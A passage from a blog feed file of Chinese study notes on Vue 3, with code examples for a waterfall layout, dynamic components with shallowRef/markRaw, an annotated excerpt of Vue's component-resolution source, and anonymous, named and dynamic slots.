class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;#33CC00&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;#330033&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 100,</span><br><span class="line">    background: &#x27;#0066CC&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;skyblue&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 100,</span><br><span class="line">    background: &#x27;#006666&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;yellow&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;yellow&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 100,</span><br><span class="line">    background: &#x27;#33CCFF&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 400,</span><br><span class="line">    background: &#x27;yellow&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 400,</span><br><span class="line">    background: &#x27;yellow&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 200,</span><br><span class="line">    background: &#x27;#33FF00&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 300,</span><br><span class="line">    background: &#x27;yellow&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    height: 100,</span><br><span class="line">    background: &#x27;green&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>WaterFall.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;wraps&quot;&gt;</span><br><span class="line">    &lt;div </span><br><span class="line">      :style=&quot;&#123;</span><br><span class="line">        height:item.height+&#x27;px&#x27;,</span><br><span class="line">        backgroundColor:item.background,</span><br><span class="line">        left:item.left+&#x27;px&#x27;,</span><br><span class="line">        top:item.top+&#x27;px&#x27;</span><br><span class="line">      &#125;&quot;</span><br><span class="line">      v-for=&quot;(item, index) in waterList&quot; </span><br><span class="line">      :key=&quot;index&quot;</span><br><span class="line">      class=&quot;items&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; onMounted, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const props = defineProps&lt;&#123;</span><br><span class="line">  list: any[]</span><br><span class="line">&#125;&gt;()</span><br><span class="line"></span><br><span class="line">const waterList = reactive&lt;any[]&gt;([])</span><br><span class="line"></span><br><span class="line">const heightList: number[] = []</span><br><span class="line"></span><br><span class="line">const init = ()=&gt; &#123;</span><br><span class="line">  // 横向预留空隙</span><br><span class="line">  const width = 130</span><br><span class="line">  // 视口区宽度</span><br><span class="line">  const x = document.body.clientWidth</span><br><span class="line">  // 列数</span><br><span class="line">  const column = Math.floor(x/width)</span><br><span class="line"></span><br><span class="line">  console.log(width, x, column)</span><br><span class="line">  for(let i = 0; i &lt; props.list.length; i++) &#123;</span><br><span class="line">    // 第一列</span><br><span class="line">    if(i &lt; column) &#123;</span><br><span class="line">      waterList.push(&#123;</span><br><span class="line">        ...props.list[i],</span><br><span class="line">        left: i * width,</span><br><span class="line">        top: 20</span><br><span class="line">      &#125;)</span><br><span class="line">  </span><br><span class="line">      // 更新高度数组</span><br><span class="line">      heightList.push(props.list[i].height + 20)</span><br><span class="line">    &#125; </span><br><span class="line">    // 后面的列</span><br><span class="line">    else &#123;</span><br><span class="line">      // 最小的高度值</span><br><span class="line">      let current = heightList[0]</span><br><span class="line">      // 最小高度列的索引</span><br><span class="line">      let index = 0</span><br><span class="line"></span><br><span class="line">      // 找到最小高度列</span><br><span class="line">      heightList.forEach((h, i)=&gt; &#123;</span><br><span class="line">        if(current &gt; h) &#123;</span><br><span class="line">          current = h</span><br><span class="line">          index = i</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      waterList.push(&#123;</span><br><span class="line">        ...props.list[i],</span><br><span class="line">        top: current + 20,</span><br><span class="line">        left: index * width</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      // 更新高度数组</span><br><span class="line">      heightList[index] = heightList[index] + props.list[i].height + 20</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">onMounted(()=&gt; &#123;</span><br><span class="line">  init()</span><br><span class="line">  console.log(waterList)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.wraps &#123;</span><br><span class="line">  position: relative;</span><br><span class="line"></span><br><span class="line">  .items &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    width: 120px;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>动态组件</title>
    <url>/web/study/Vue/16.%E5%8A%A8%E6%80%81%E7%BB%84%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><p>动态组件就是让多个组件使用同一个挂载点，并动态切换。</p>
<p>在挂载点使用component标签，然后使用<code>v-bind:is=&quot;组件&quot;</code>，通过is切换组件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;component :is=&quot;A&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import A from &quot;./A.vue&quot;</span><br><span class="line">import B from &quot;./B.vue&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div style=&quot;display: flex;&quot;&gt;</span><br><span class="line">    &lt;div </span><br><span class="line">      @click=&quot;switchCom(item, index)&quot;</span><br><span class="line">      :class=&quot;[active == index? &#x27;active&#x27;: &#x27;&#x27;]&quot; class=&quot;tabs&quot; </span><br><span class="line">      v-for=&quot;(item, index) in data&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">      &lt;div&gt;&#123;&#123; item.name &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;component :is=&quot;comId&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">// 传组件对象的用法</span><br><span class="line">import &#123; ref, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line">import B from &quot;@/components/B.vue&quot;</span><br><span class="line">import C from &quot;@/components/C.vue&quot;</span><br><span class="line"></span><br><span class="line">const comId = ref(A)</span><br><span class="line">const active = ref(0)</span><br><span class="line"></span><br><span class="line">const data = reactive([</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;A组件&quot;,</span><br><span class="line">    com: A</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;B组件&quot;,</span><br><span class="line">    com: B</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;C组件&quot;,</span><br><span class="line">    com: C</span><br><span class="line">  &#125;,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">const switchCom = (item: any, index: number)=&gt; &#123;</span><br><span class="line">  comId.value = item.com</span><br><span class="line">  active.value = index</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">// 另一种用法（传字符串），注册组件后就可以直接通过组件名切换</span><br><span class="line">import AVue from &quot;@/components/A.vue&quot;</span><br><span class="line">import BVue from &quot;@/components/B.vue&quot;</span><br><span class="line">import CVue from &quot;@/components/C.vue&quot;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    AVue,BVue,CVue</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const comId2 = shallowRef(&quot;AVue&quot;)</span><br><span class="line">const active2 = ref(0)</span><br><span class="line"></span><br><span class="line">const data2 = reactive([</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;A组件&quot;,</span><br><span class="line">    com: &quot;AVue&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;B组件&quot;,</span><br><span class="line">    com: &quot;BVue&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;C组件&quot;,</span><br><span class="line">    com: &quot;CVue&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">const switchCom2 = (item: any, index: number)=&gt; &#123;</span><br><span class="line">  comId2.value = item.com</span><br><span class="line">  active2.value = index</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.active &#123;</span><br><span class="line">  background-color: #ccc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.tabs &#123;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">  padding: 5px 10px;</span><br><span class="line">  margin: 5px;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>A.vue、B.vue和C.vue省略。</p>
<h1 id="性能调优"><a href="#性能调优" class="headerlink" title="性能调优"></a>性能调优</h1><p>引入组件时会包含组件自身的一些信息，但这些信息没有必要被劫持，为了性能起见可以跳过它们。</p>
<p>可以使用shallowRef或markRaw。</p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div style=&quot;display: flex;&quot;&gt;</span><br><span class="line">    &lt;div </span><br><span class="line">      @click=&quot;switchCom(item, index)&quot;</span><br><span class="line">      :class=&quot;[active == index? &#x27;active&#x27;: &#x27;&#x27;]&quot; class=&quot;tabs&quot; </span><br><span class="line">      v-for=&quot;(item, index) in data&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">      &lt;div&gt;&#123;&#123; item.name &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;component :is=&quot;comId&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, reactive, markRaw, shallowRef &#125; from &#x27;vue&#x27;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line">import B from &quot;@/components/B.vue&quot;</span><br><span class="line">import C from &quot;@/components/C.vue&quot;</span><br><span class="line"></span><br><span class="line">// 使comId响应式只达到.value这一层</span><br><span class="line">const comId = shallowRef(A)</span><br><span class="line">const active = ref(0)</span><br><span class="line"></span><br><span class="line">// 使这些组件对象变为不可被代理</span><br><span class="line">const data = reactive([</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;A组件&quot;,</span><br><span class="line">    com: markRaw(A)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;B组件&quot;,</span><br><span class="line">    com: markRaw(B)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;C组件&quot;,</span><br><span class="line">    com: markRaw(C)</span><br><span class="line">  &#125;,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">const switchCom = (item: any, index: number)=&gt; &#123;</span><br><span class="line">  comId.value = item.com</span><br><span class="line">  active.value = index</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.active &#123;</span><br><span class="line">  background-color: #ccc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.tabs &#123;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">  padding: 5px 10px;</span><br><span class="line">  margin: 5px;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>由图可知，使用component时，虚拟DOM调用了<code>_resolveDynamicComponent</code>函数。（<a href="https://template-explorer.vuejs.org/">工具</a>）</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305201530449.png"></p>
<p>在Vue源码（<code>/package/runtime-core/src/helpers/resolveAssets.ts</code>）中可以看到watch的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// is属性就是此处的component参数</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">resolveDynamicComponent</span>(<span class="params">component: <span class="built_in">unknown</span></span>): <span class="title class_">VNodeTypes</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isString</span>(component)) &#123;</span><br><span class="line">    <span class="comment">// 如果是字符串，作处理</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">resolveAsset</span>(<span class="variable constant_">COMPONENTS</span>, component, <span class="literal">false</span>) || component</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// invalid types will fallthrough to createVNode and raise warning</span></span><br><span class="line">    <span class="comment">// 如果是对象，直接返回，然后调用render，重新patch，重新创建组件</span></span><br><span class="line">    <span class="keyword">return</span> (component || <span class="variable constant_">NULL_DYNAMIC_COMPONENT</span>) <span class="keyword">as</span> <span class="built_in">any</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">resolveAsset</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="keyword">type</span>: <span class="keyword">typeof</span> COMPONENTS,</span></span><br><span class="line"><span class="params">  name: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  warnMissing?: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">  maybeSelfReference?: <span class="built_in">boolean</span></span></span><br><span class="line"><span class="params"></span>): <span class="title class_">ConcreteComponent</span> | <span class="literal">undefined</span></span><br><span class="line"><span class="comment">// overload 2: directives</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">resolveAsset</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="keyword">type</span>: <span class="keyword">typeof</span> DIRECTIVES,</span></span><br><span class="line"><span class="params">  name: <span class="built_in">string</span></span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Directive</span> | <span class="literal">undefined</span></span><br><span class="line"><span class="comment">// implementation</span></span><br><span class="line"><span class="comment">// overload 3: filters (compat only)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">resolveAsset</span>(<span class="params"><span class="keyword">type</span>: <span class="keyword">typeof</span> FILTERS, name: <span class="built_in">string</span></span>): <span class="title class_">Function</span> | <span class="literal">undefined</span></span><br><span class="line"><span class="comment">// implementation</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">resolveAsset</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="keyword">type</span>: AssetTypes,</span></span><br><span class="line"><span class="params">  name: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  warnMissing = <span class="literal">true</span>,</span></span><br><span class="line"><span class="params">  maybeSelfReference = <span class="literal">false</span></span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> instance = currentRenderingInstance || currentInstance <span class="comment">// 获取组件实例</span></span><br><span class="line">  <span class="keyword">if</span> (instance) &#123;</span><br><span class="line">    <span class="comment">// 读取组件实例上的type（代码书写方式）</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Component</span> = instance.<span class="property">type</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// explicit self name has highest priority</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">type</span> === <span class="variable constant_">COMPONENTS</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> selfName = <span class="title function_">getComponentName</span>(</span><br><span class="line">        <span class="title class_">Component</span>,</span><br><span class="line">        <span class="literal">false</span> <span class="comment">/* do not include inferred name to avoid breaking existing code */</span></span><br><span class="line">      )</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        selfName &amp;&amp;</span><br><span class="line">        (selfName === name ||</span><br><span class="line">          selfName === <span class="title function_">camelize</span>(name) ||</span><br><span class="line">          selfName === <span class="title function_">capitalize</span>(<span class="title function_">camelize</span>(name)))</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Component</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// res是当前要切换的组件</span></span><br><span class="line">    <span class="keyword">const</span> res =</span><br><span class="line">      <span class="comment">// local registration</span></span><br><span class="line">      <span class="comment">// check instance[type] first which is resolved for options API</span></span><br><span class="line">      <span class="comment">// 局部注册</span></span><br><span class="line">      <span class="title function_">resolve</span>(instance[<span class="keyword">type</span>] || (<span class="title class_">Component</span> <span class="keyword">as</span> <span class="title class_">ComponentOptions</span>)[<span class="keyword">type</span>], name) ||</span><br><span class="line">      <span class="comment">// global registration</span></span><br><span class="line">      <span class="comment">// 全局注册</span></span><br><span class="line">      <span class="title function_">resolve</span>(instance.<span class="property">appContext</span>[<span class="keyword">type</span>], name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!res &amp;&amp; maybeSelfReference) &#123;</span><br><span class="line">      <span class="comment">// fallback to implicit self-reference</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Component</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__DEV__ &amp;&amp; warnMissing &amp;&amp; !res) &#123;</span><br><span class="line">      <span class="keyword">const</span> extra =</span><br><span class="line">        <span class="keyword">type</span> === <span class="variable constant_">COMPONENTS</span></span><br><span class="line">          ? <span class="string">`\nIf this is a native custom element, make sure to exclude it from `</span> +</span><br><span class="line">            <span class="string">`component resolution via compilerOptions.isCustomElement.`</span></span><br><span class="line">          : <span class="string">``</span></span><br><span class="line">      <span class="title function_">warn</span>(<span class="string">`Failed to resolve <span class="subst">$&#123;<span class="keyword">type</span>.slice(<span class="number">0</span>, -<span class="number">1</span>)&#125;</span>: <span class="subst">$&#123;name&#125;</span><span class="subst">$&#123;extra&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回组件</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">    <span class="title function_">warn</span>(</span><br><span class="line">      <span class="string">`resolve<span class="subst">$&#123;capitalize(<span class="keyword">type</span>.slice(<span class="number">0</span>, -<span class="number">1</span>))&#125;</span> `</span> +</span><br><span class="line">        <span class="string">`can only be used in render() or setup().`</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>插槽slot</title>
    <url>/web/study/Vue/17.%E6%8F%92%E6%A7%BDslot.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="匿名插槽"><a href="#匿名插槽" class="headerlink" title="匿名插槽"></a>匿名插槽</h1><p>一个不命名的插槽。</p>
<p>Dialog&#x2F;index.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;main class=&quot;main&quot;&gt;</span><br><span class="line">      &lt;div v-for=&quot;(item, index) in data&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">        &lt;!-- 直接这样定义就是匿名插槽 --&gt;</span><br><span class="line">        &lt;!-- 加上v-bind的属性就是插槽作用域，父组件进行插槽使用时可以获取这里的值 --&gt;</span><br><span class="line">        &lt;slot :data=&quot;item&quot; :index=&quot;index&quot;&gt;&lt;/slot&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/main&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">type names = &#123;</span><br><span class="line">  name: string,</span><br><span class="line">  age: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const data = reactive&lt;names[]&gt;([</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;yajue&quot;,</span><br><span class="line">    age: 24</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;knn&quot;,</span><br><span class="line">    age: 300</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;snnn&quot;,</span><br><span class="line">    age: 30</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;bnkrg&quot;,</span><br><span class="line">    age: 17</span><br><span class="line">  &#125;</span><br><span class="line">])</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.main &#123;</span><br><span class="line">  height: 300px;</span><br><span class="line">  background-color: green;</span><br><span class="line">  color: white;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;Dialog&gt;</span><br><span class="line">      &lt;!-- 使用匿名插槽 --&gt;</span><br><span class="line">      &lt;!-- v-slot可以取插槽作用域的值 --&gt;</span><br><span class="line">      &lt;!-- &lt;template v-slot=&quot;&#123; data, index &#125;&quot;&gt; --&gt;</span><br><span class="line">      &lt;!-- 匿名插槽的简写需要写成#default --&gt;</span><br><span class="line">      &lt;template #default=&quot;&#123; data, index &#125;&quot;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          &#123;&#123; index &#125;&#125;. &#123;&#123; data.name &#125;&#125; ---- &#123;&#123; data.age &#125;&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/Dialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import Dialog from &quot;@/components/Dialog/index.vue&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="具名插槽"><a href="#具名插槽" class="headerlink" title="具名插槽"></a>具名插槽</h1><p>被起了名字的插槽。</p>
<p>Dialog&#x2F;index.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;header class=&quot;header&quot;&gt;</span><br><span class="line">      &lt;!-- 加上name属性就是具名插槽，名字是name的值 --&gt;</span><br><span class="line">      &lt;slot name=&quot;header&quot; :data=&quot;111&quot;&gt;&lt;/slot&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.header &#123;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: red;</span><br><span class="line">  color: white;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;Dialog&gt;</span><br><span class="line">      &lt;!-- 使用具名插槽 --&gt;</span><br><span class="line">      &lt;!-- &lt;template v-slot:header&gt; --&gt;</span><br><span class="line">      &lt;!-- v-slot可以被简写成井号# --&gt;</span><br><span class="line">      &lt;template #header=&quot;&#123; data &#125;&quot;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          header&#123;&#123; data &#125;&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/Dialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import Dialog from &quot;@/components/Dialog/index.vue&quot;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="动态插槽"><a href="#动态插槽" class="headerlink" title="动态插槽"></a>动态插槽</h1><p>使用变量作为名的插槽。</p>
<p>Dialog&#x2F;index.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;footer class=&quot;footer&quot;&gt;</span><br><span class="line">      &lt;slot name=&quot;footer&quot;&gt;&lt;/slot&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.footer &#123;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: blue;</span><br><span class="line">  color: white;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;Dialog&gt;</span><br><span class="line">      &lt;!-- 使用动态插槽 --&gt;</span><br><span class="line">      &lt;template #[name]&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          草</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/Dialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line">import Dialog from &quot;@/components/Dialog/index.vue&quot;</span><br><span class="line"></span><br><span class="line">let name = ref(&quot;footer&quot;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>全局组件、局部组件、递归组件</title>
    <url>/web/study/Vue/15.%E5%85%A8%E5%B1%80%E7%BB%84%E4%BB%B6%E3%80%81%E5%B1%80%E9%83%A8%E7%BB%84%E4%BB%B6%E3%80%81%E9%80%92%E5%BD%92%E7%BB%84%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="局部组件"><a href="#局部组件" class="headerlink" title="局部组件"></a>局部组件</h1><p>页面上模块非常多，又不想冗杂地写在同一个页面内，就可以把它拆成一个局部组件。</p>
<p>Card.vue：</p>
